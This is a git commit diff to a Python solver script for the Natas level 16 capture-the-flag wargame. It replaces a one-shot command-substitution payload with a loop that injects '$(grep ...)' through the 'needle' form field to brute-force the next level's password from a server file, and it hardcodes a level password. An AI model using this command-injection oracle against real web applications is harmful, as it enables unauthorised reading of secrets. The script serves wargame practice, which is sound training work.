ed4e8cf8f94d03212e44129c0cb2b442251dfb23
Rodrigo Carvalho <rodrigorsdc@gmail.com>
2024-11-15 12:00:39 -0300

    natas: add natas16 flag

--- natas/natas16/solve.py
+++ natas/natas16/solve.py
@@ -4,9 +4,18 @@ url = 'http://natas16.natas.labs.overthewire.org'
 user = 'natas16'
 password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
 
-injection = '$(cat /etc/natas_webpass/natas17 >> dictionary.txt)'
-data = {'needle': injection} 
+natas17_pass = ''
+caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+for i in range (1, 33):
+    for c in caracteres:
+        temp_pass = natas17_pass + c
+        injection = f'$(grep ^{temp_pass} /etc/natas_webpass/natas17)'
+        print(injection)
+        data = {"needle": injection}
+        response = requests.post(url, auth=(user, password), data=data)
+        if "Catholic" not in response.text:
+           print(f'Caractere {c} no posição {i}') 
+           natas17_pass = natas17_pass + c
+           break
 
-response = requests.get(url, auth=(user, password), params=data)
-print(response.text)
-
+print(natas17_pass)
